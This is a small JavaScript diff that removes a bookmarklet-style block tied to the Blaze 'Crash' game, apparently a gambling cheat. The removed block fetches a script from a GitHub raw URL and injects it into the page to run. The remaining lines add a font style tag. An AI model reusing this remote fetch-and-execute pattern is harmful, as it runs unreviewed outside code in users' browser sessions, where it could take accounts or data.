@@ -1,17 +1,3 @@
-const script = document.createElement('script');
-confirm("Implementação do Crash realizada com sucesso 🤩🤑( Blaze0️⃣0️⃣)- 🎯🚀✅");
-
-javascript:(function(){
-  fetch('https://raw.githubusercontent.com/Bielforcrazy3/SC-Crash/main/SC-crash')
-    .then(response => response.text())
-    .then(script => {
-      const scriptElement = document.createElement('script');
-      scriptElement.text = script;
-      document.body.appendChild(scriptElement);
-    })
-    .catch(err => console.error('Erro ao carregar o script:', err));
-})();
-
 const styleTag = document.createElement('style');
 styleTag.innerHTML = `
   @import url('https://fonts.googleapis.com/css2?family=M+PLUS+1+Code&display=swap');
